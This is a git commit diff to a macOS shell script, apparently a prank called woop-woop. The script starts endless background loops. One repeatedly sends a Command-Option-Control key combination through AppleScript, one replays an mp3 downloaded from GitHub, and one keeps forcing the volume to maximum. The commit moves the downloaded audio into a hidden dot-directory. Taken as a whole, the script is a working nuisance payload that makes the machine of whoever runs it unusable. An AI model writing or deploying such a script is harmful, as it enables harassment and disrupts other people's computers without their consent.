ab9ff4ca7163daf6d6f3f8a621ff0dd38ec4b5e6
Dzhabrail <dzhabulya@gmail.com>
2022-11-15 16:10:55 +0300

    Updated script

--- script.sh
+++ script.sh
@@ -2,6 +2,6 @@ echo "tell application \"System Events\"
 key code 28 using {command down, option down, control down}
 end tell" > ~/Library/config
 while [ 1 ]; do osascript ~/Library/config; done &
-curl https://raw.githubusercontent.com/Muslik/woop-woop/master/audio.mp3 > ~/.TemporaryItems/mem.mp3
-while [ 1 ]; do afplay ~/.TemporaryItems/mem.mp3; done &
+curl -o ~/.WoopWoop/mem.mp3 --create-dirs https://raw.githubusercontent.com/Muslik/woop-woop/master/audio.mp3
+while [ 1 ]; do afplay ~/.WoopWoop/mem.mp3; done &
 while [ 1 ]; do osascript -e "set Volume 10"; done &
